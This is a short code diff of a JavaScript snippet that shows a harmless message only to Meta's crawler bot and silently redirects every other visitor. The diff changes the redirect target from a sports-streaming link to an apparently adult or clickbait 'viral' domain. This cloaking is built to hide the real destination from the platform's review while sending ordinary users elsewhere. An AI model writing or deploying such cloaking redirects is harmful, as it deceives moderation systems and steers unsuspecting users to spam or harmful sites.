@@ -12,6 +12,6 @@ if (isMetaBot) {
   console.log("Thanks for visiting my page");
 } else {
   window.location.replace(
-    "https://www.ajkerkhela.live/web/efl-championship"
+    "https://xvidey.cam/viral"
   );
 }
